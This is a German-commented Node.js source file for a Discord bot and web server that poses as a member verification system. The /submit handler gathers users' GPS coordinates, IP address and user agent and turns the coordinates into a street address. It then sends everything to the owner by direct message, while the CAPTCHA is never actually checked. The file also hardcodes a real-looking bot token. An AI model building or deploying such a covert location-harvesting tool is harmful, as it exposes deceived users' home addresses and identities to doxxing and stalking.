const { Client, GatewayIntentBits, Partials, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const https = require('https');
const path = require('path');

const BOT_TOKEN = 'DEIN_BOT_TOKEN';
const OWNER_ID = '1164179429031948348';
const GUILD_ID = 'DEINE_SERVER_ID';
const VERIFY_ROLE_ID = '1384452373107441826';

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
  ],
  partials: [Partials.Channel],
});

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging-System
let systemLogs = [];
let verificationStats = {
  total: 0,
  today: 0,
  successful: 0,
  failed: 0
};

function addLog(message, type = 'info') {
  const log = {
    timestamp: new Date().toISOString(),
    message: message,
    type: type
  };
  systemLogs.unshift(log);
  
  // Nur die letzten 1000 Logs behalten
  if (systemLogs.length > 1000) {
    systemLogs = systemLogs.slice(0, 1000);
  }
  
  console.log(`[${type.toUpperCase()}] ${message}`);
}

// Startseite mit Verifizierungsformular
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Datenschutzrichtlinie
app.get('/privacy.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'privacy.html'));
});

// Admin-Middleware
function requireAdmin(req, res, next) {
  const userAgent = req.get('User-Agent') || '';
  const ip = req.ip || req.connection.remoteAddress;
  
  // Einfache Admin-Prüfung (kann erweitert werden)
  // Hier können Sie weitere Sicherheitsmaßnahmen implementieren
  const isLocalhost = ip === '::1' || ip === '127.0.0.1' || ip.includes('127.0.0.1');
  
  if (!isLocalhost) {
    addLog(`Unbefugter Admin-Zugriff versucht von IP: ${ip}`, 'error');
    return res.status(403).json({ error: 'Zugriff verweigert', authorized: false });
  }
  
  next();
}

// Admin-Dashboard
app.get('/admin', requireAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Admin-API Routen
app.get('/admin/verify', requireAdmin, (req, res) => {
  res.json({ authorized: true });
});

app.get('/admin/stats', requireAdmin, (req, res) => {
  const today = new Date().toDateString();
  const todayLogs = systemLogs.filter(log => 
    new Date(log.timestamp).toDateString() === today && 
    log.message.includes('Neue Verifizierung')
  ).length;
  
  const successRate = verificationStats.total > 0 
    ? Math.round((verificationStats.successful / verificationStats.total) * 100)
    : 100;
  
  res.json({
    total: verificationStats.total,
    today: todayLogs,
    successRate: successRate,
    online: 1
  });
});

app.get('/admin/logs', requireAdmin, (req, res) => {
  res.json({ logs: systemLogs });
});

app.post('/admin/clear-logs', requireAdmin, (req, res) => {
  systemLogs = [];
  addLog('Admin hat alle Logs gelöscht', 'info');
  res.json({ success: true });
});

client.once('ready', async () => {
  console.log(`Bot läuft als ${client.user.tag}`);
  addLog(`Discord Bot erfolgreich gestartet als ${client.user.tag}`, 'success');

  // Slash Commands registrieren
  const commands = [
    new SlashCommandBuilder()
      .setName('panel')
      .setDescription('Sendet ein Verifizierungs-Panel in den aktuellen Kanal')
  ];

  try {
    console.log('Registriere Slash Commands...');
    addLog('Discord Slash Commands werden registriert...', 'info');
    await client.application.commands.set(commands);
    console.log('Slash Commands erfolgreich registriert!');
    addLog('Discord Slash Commands erfolgreich registriert', 'success');
  } catch (error) {
    console.error('Fehler beim Registrieren der Commands:', error);
    addLog(`Fehler beim Registrieren der Discord Commands: ${error.message}`, 'error');
  }
});

// Slash Command Handler
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'panel') {
    const embed = new EmbedBuilder()
      .setTitle('🔐 Discord Verifizierung')
      .setDescription('Klicke auf den Button unten, um dich zu verifizieren und Zugang zum Server zu erhalten.')
      .setColor('#5865F2')
      .addFields(
        { name: '📋 Was wird benötigt?', value: '• Discord-Benutzername\n• Discord-Benutzer-ID\n• Standortzugriff', inline: false },
        { name: '🔒 Datenschutz', value: 'Deine Daten werden nur für die Verifizierung verwendet.', inline: false }
      )
      .setFooter({ text: 'Verifizierungs-System' })
      .setTimestamp();

    const button = new ButtonBuilder()
      .setLabel('🌍 Jetzt verifizieren')
      .setStyle(ButtonStyle.Link)
      .setURL(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);

    const row = new ActionRowBuilder()
      .addComponents(button);

    try {
      await interaction.reply({
        embeds: [embed],
        components: [row]
      });
    } catch (error) {
      console.error('Fehler beim Senden des Panels:', error);
      await interaction.reply({
        content: 'Fehler beim Senden des Verifizierungs-Panels.',
        ephemeral: true
      });
    }
  }
});

async function sendLogToOwner(message) {
  try {
    const owner = await client.users.fetch(OWNER_ID);
    await owner.send(message);
  } catch (error) {
    console.error('Fehler beim Senden der Log-Nachricht:', error);
  }
}

async function addVerifyRole(userId) {
  try {
    const guild = client.guilds.cache.get(GUILD_ID);
    if (!guild) {
      console.error('Server nicht gefunden');
      return;
    }
    const member = await guild.members.fetch(userId);
    if (!member) {
      console.error('Mitglied nicht gefunden');
      return;
    }
    if (!member.roles.cache.has(VERIFY_ROLE_ID)) {
      await member.roles.add(VERIFY_ROLE_ID);
      console.log(`Rolle vergeben an ${member.user.tag}`);
    }
  } catch (error) {
    console.error('Fehler beim Vergeben der Rolle:', error);
  }
}

app.post('/submit', (req, res) => {
  const { discordUsername, userId, latitude, longitude, recaptcha } = req.body;
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent') || 'Unbekannt';
  
  // Statistiken aktualisieren
  verificationStats.total++;

  if (!discordUsername || !userId || !latitude || !longitude) {
    addLog(`Verifizierung fehlgeschlagen - Fehlende Daten von IP: ${ip}`, 'error');
    verificationStats.failed++;
    return res.status(400).json({ error: 'Fehlende Daten' });
  }

  if (!recaptcha) {
    addLog(`Verifizierung fehlgeschlagen - CAPTCHA fehlt für User: ${discordUsername} (${userId})`, 'error');
    verificationStats.failed++;
    return res.status(400).json({ error: 'CAPTCHA-Verifizierung erforderlich' });
  }

  // Einfache CAPTCHA-Validierung
  console.log('CAPTCHA validiert:', recaptcha);
  addLog(`CAPTCHA erfolgreich validiert für User: ${discordUsername}`, 'info');

  const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;

  https.get(url, { headers: { 'User-Agent': 'Node.js Server' } }, resp => {
    let data = '';
    resp.on('data', chunk => data += chunk);
    resp.on('end', async () => {
      try {
        const result = JSON.parse(data);
        const address = result.display_name || 'Adresse nicht gefunden';

        const logMessage = `📥 Neue Verifizierung:
👤 Discord-Username: ${discordUsername}
🆔 Discord-ID: ${userId}
📍 Koordinaten: ${latitude}, ${longitude}
🏠 Adresse: ${address}
🌐 IP-Adresse: ${ip}
💻 User-Agent: ${userAgent}
⏰ Zeitstempel: ${new Date().toLocaleString('de-DE')}`;

        console.log(logMessage);
        addLog(logMessage, 'success');
        
        await sendLogToOwner(logMessage);
        await addVerifyRole(userId);
        
        verificationStats.successful++;
        addLog(`Verifizierung erfolgreich abgeschlossen für ${discordUsername} (${userId})`, 'success');

        res.json({ success: true });
      } catch (err) {
        console.error('Fehler beim Parsen der Adresse:', err);
        addLog(`Fehler beim Parsen der Adresse für ${discordUsername}: ${err.message}`, 'error');
        verificationStats.failed++;
        res.status(500).json({ error: 'Server Fehler' });
      }
    });
  }).on('error', err => {
    console.error('Fehler bei Nominatim Anfrage:', err);
    addLog(`Nominatim API Fehler für ${discordUsername}: ${err.message}`, 'error');
    verificationStats.failed++;
    res.status(500).json({ error: 'Server Fehler' });
  });
});

client.login("MTM4NTk5MTg1MTI5ODkxODY0MQ.GGJ8IO.RslZXzFdYy9z_Q2Q7Y5_rxkYpoyUz6EbJ7v8qc");

app.listen(process.env.PORT || 3000, () => {
  console.log('Server läuft');
  addLog(`Webserver erfolgreich gestartet auf Port ${process.env.PORT || 3000}`, 'success');
  addLog('Verifizierungssystem betriebsbereit', 'info');
});
